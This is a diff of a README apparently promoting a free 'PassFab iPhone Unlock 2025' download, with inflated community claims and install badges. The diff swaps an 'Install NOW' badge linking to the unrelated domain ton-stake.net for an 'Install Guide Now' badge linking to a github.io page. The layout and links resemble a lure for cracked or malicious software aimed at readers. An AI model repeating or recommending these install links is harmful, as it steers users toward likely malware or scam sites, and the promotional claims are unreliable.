@@ -50,7 +50,7 @@ Begin your unlocking journey with PassFab iPhone Unlock 2025 using these simple 
 - 🌍 **Active Community**: Backed by 120K+ downloads and 80K+ subscribers.  
 - 📅 **2025 Updates**: Stay current with the latest iOS unlocking features.  
 
-[![Install PassFab iPhone Unlock](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  <a href="https://free-passfab-iphone-community.github.io/.github/" target="_blank">
+<a href="https://free-passfab-iphone-community.github.io/.github/" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide_Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 ---
